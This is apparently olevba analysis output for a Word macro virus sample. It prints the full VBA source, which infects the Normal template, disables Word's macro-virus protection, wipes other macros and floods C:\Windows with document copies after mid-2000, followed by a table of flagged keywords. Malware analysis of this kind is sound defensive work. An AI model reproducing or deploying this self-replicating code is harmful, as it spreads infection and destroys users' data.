olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.ba-2b9d3d6eb7d644e2671d496a95767c0e389b75a8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.ba-2b9d3d6eb7d644e2671d496a95767c0e389b75a8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_close()
  
  On Error GoTo Finm
  If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
      Const exi = "la macro de colombia xxx"
      Dim DInfec, planinfec As Boolean
      Dim Docu, Plan As Object
      Dim modulin, contemodu, Ninfec As String
      Dim Nume As Integer
      Dim Copform As Object
  
   
      Set Docu = ActiveDocument.VBProject.VBComponents.Item(1)
      Set Plan = NormalTemplate.VBProject.VBComponents.Item(1)
      
      SaveDoc = ActiveDocument.Saved
      Saveplan = NormalTemplate.Saved
   
      DInfec = Docu.CodeModule.Find(exi, 1, 1, 40000, 40000)
      plainfec = Plan.CodeModule.Find(exi, 1, 1, 40000, 40000)

      'Ninfec = "'" & " "
      
      Options.VirusProtection = False
   
      Nume = Mid(Int(Rnd() * 10), 1, 1)
      Nume = Nume
      nume1 = 7
      Nume2 = 3
      If Nume = nume1 Or Nume = Nume2 Or plainfec = False Then
         If DInfec = True And plainfec = False Then
            On Error Resume Next
            For il = 1 To Plan.CodeModule.CountOfLines
                Plan.CodeModule.DeleteLines 1
            Next
            On Error GoTo Finm
            'Docu.CodeModule.addfromstring Ninfec
            contemodu = Docu.CodeModule.Lines(1, Docu.CodeModule.CountOfLines)
            Plan.CodeModule.AddFromString contemodu
         End If

         If DInfec = False And plainfec = True Then
            On Error Resume Next
            For il = 1 To Docu.CodeModule.CountOfLines
                Docu.CodeModule.DeleteLines 1
            Next
            On Error GoTo Finm
           'Plan.CodeModule.addfromstring Ninfec
            contemodu = Plan.CodeModule.Lines(1, Plan.CodeModule.CountOfLines)
            Docu.CodeModule.AddFromString contemodu
         End If
         
         If SaveDoc = True Then ThisDocument.Save
         
      End If
      End If
  
    sd = Day(Now()) & "-" & Month(Now()) & "-" & Year(Now())
  sd = Trim(sd)
  If Year(Now()) >= 2000 And Month(Now()) > 6 Then
    ChangeFileOpenDirectory "C:\Windows\"
    For i = 1 To 999999991
        ActiveDocument.SaveAs FileName:=("AA" & i & "AA.DOC"), FileFormat:= _
        wdFormatDocument, LockComments:=False, Password:="", AddToRecentFiles:= _
        True, WritePassword:="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:= _
        False, SaveNativePictureFormat:=False, SaveFormsData:=False, _
        SaveAsAOCELetter:=False
    Next
  End If
  GoTo Finb
  
Finm:
  On Error Resume Next
  For il = 1 To Docu.CodeModule.CountOfLines
    Docu.CodeModule.DeleteLines 1
  Next
  GoTo Finb
Finb:
 On Error Resume Next
End Sub
Private Sub Document_Open()
   On Error Resume Next
   Const exi = "la macro de colombia xxx"
   Dim Docu, Plan As Object
   Set Docu = ActiveDocument.VBProject.VBComponents.Item(1)
   If Docu.CodeModule.CountOfLines > 0 Then
     DInfec = Docu.CodeModule.Find(exi, 1, 1, 40000, 40000)
     If DInfec = False Then
        For il = 1 To Docu.CodeModule.CountOfLines
        Docu.CodeModule.DeleteLines 1
      Next
     End If
   End If

   Set Plan = NormalTemplate.VBProject.VBComponents.Item(1)
   If Plan.CodeModule.CountOfLines > 0 Then
     plainfec = Plan.CodeModule.Find(exi, 1, 1, 40000, 40000)
     If plainfec = False Then
        For il = 1 To Plan.CodeModule.CountOfLines
        Plan.CodeModule.DeleteLines 1
      Next
     End If
   End If
End Sub
Private Sub viewvbcode(): MsgBox "The Visual Basic environment could not be initialized. Please run setup to install it correctly.", vbCritical: End Sub ' )(nepo_tnemucod buS etavirP


















































Private Sub SpinButton1_Change()

End Sub













































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |SpinButton1_Change  |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|environment         |May read system environment variables        |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
